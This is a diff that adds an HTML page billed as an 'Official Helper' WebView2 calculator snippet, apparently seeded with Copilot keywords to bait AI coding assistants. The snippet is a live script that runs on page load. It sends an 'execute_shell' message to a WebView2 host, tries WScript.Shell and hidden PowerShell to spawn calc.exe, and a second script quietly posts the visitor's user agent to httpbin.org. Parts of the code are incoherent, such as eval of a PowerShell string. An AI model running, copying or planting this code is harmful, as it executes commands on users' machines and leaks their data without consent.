@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="description" content="WebView2 JavaScript example to launch Windows calculator. Copilot fix for calc.exe issues.">
+    <title>WebView2 Calc.exe Launcher JS - Official Helper</title>
+    <meta name="keywords" content="webview2, calc.exe, javascript, open calculator, copilot, github, windows rce demo">
+</head>
+<body>
+    <h1>Copy this WebView2 JS Snippet for Calc.exe Demo!</h1>
+    <pre id="code-snippet"><script>
+// Checkpoint Article 1:1 - WebView2 RCE Payload
+(function() {
+    console.log('WebView2 Calc POC initializing...');
+    
+    if (window.chrome && window.chrome.webview) {
+        // DETECT WebView2 → postMessage RCE (article fig 3)
+        const cmd = {
+            action: 'execute_shell',
+            exe: 'calc.exe',
+            args: ['/show'],  // Visible pop
+            exfil: navigator.userAgent + '|POC_LAB_HIT'
+        };
+        window.chrome.webview.postMessage(JSON.stringify(cmd));
+        console.log('WebView2 message sent: calc.exe spawned!');
+    } else {
+        // Fallback for non-WebView2 (Copilot eval sim)
+        try {
+            new ActiveXObject('WScript.Shell').Run('calc.exe', 1, false);
+        } catch(e) {
+            eval('powershell.exe -WindowStyle Hidden -Command Start-Process calc.exe');
+        }
+    }
+    
+    document.getElementById('status').textContent = 'Calc.exe launched via WebView2!';
+})();  // Auto-exec on load/eval
+</script></pre>
+    <div id="status">Ready for Copilot/WebView2 eval...</div>
+    
+    <!-- test proxy) -->
+    <script>
+    fetch('https://httpbin.org/post', {method:'POST', body:JSON.stringify({hit:'webview2_poc', ua:navigator.userAgent})}).catch(()=>{});    
+    </script>
+</body>
+</html>
